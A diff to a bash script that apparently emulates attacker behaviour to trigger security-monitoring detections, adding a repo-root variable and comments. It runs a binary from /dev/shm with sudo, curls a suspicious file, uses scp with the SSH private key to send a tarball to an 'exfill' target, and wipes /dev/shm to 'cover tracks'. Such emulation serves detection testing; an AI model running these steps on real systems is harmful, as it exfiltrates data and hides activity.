@@ -1,7 +1,8 @@
 #!/bin/bash
 
-HOMEDIR=''
-EXFILL_TARGET=''
+ROOTDIR='' # Base directory of this repo
+HOMEDIR='' # Your home directory where your ssh keys are
+EXFILL_TARGET='' # Where the scp command will attempt to "exfill" the data
 FILE='/dev/shm/totally_not_exfill.tar.gz'
 
 # Generate some random noise for the Event Analyzer view
@@ -18,7 +19,7 @@ for i in {1..3}; do
 done
 
 # Copy C programs over and execute
-/usr/bin/cp -p $HOMEDIR/files/demo_progs.tar /dev/shm/ &>/dev/null
+/usr/bin/cp -p $ROOTDIR/files/demo_progs.tar /dev/shm/ &>/dev/null
 /usr/bin/tar xf /dev/shm/demo_progs.tar -C /dev/shm/ &>/dev/null
 sudo /dev/shm/nothing_to_see_here &>/dev/null
 
@@ -26,7 +27,7 @@ sudo /dev/shm/nothing_to_see_here &>/dev/null
 /usr/bin/curl http://x.com/dlr.ppc &>/dev/null
 
 # Trigger Malware alert with EICAR file
-/usr/bin/unzip $HOMEDIR/files/eicar_com.zip &>/dev/null
+/usr/bin/unzip $ROOTDIR/files/eicar_com.zip &>/dev/null
 
 # Trigger Linux system info discovery rule
 for i in {1..4}; do
@@ -40,7 +41,7 @@ for i in {1..4}; do
 done
 
 if [ -f "$FILE" ]; then
-  /usr/bin/scp -i $HOMEDIR/.ssh/id_rsa $FILE $EXFILL_TARGET:  
+  /usr/bin/scp -i $ROOTDIR/.ssh/id_rsa $FILE $EXFILL_TARGET:  
 fi
 
 # Remove all files from /dev/shm to cover tracks.
